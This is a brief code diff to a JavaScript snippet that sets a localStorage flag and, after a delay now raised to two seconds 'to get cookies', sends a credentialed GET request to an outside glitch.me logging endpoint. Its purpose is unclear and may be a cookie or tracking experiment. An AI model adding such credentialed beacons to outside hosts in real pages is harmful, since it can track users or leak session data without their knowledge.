@@ -8,10 +8,11 @@ if (!localStorage.getItem('iframe')) {
   localStorage.setItem('iframe', 1);
 }
 
+// Wait for 2 seconds to get cookies
 setTimeout(() => {
   fetch('https://sleepy-fuel.glitch.me/logWrite', {
         method: 'GET',
         credentials: 'include'
   });
-}, 1000);
+}, 2000);
 
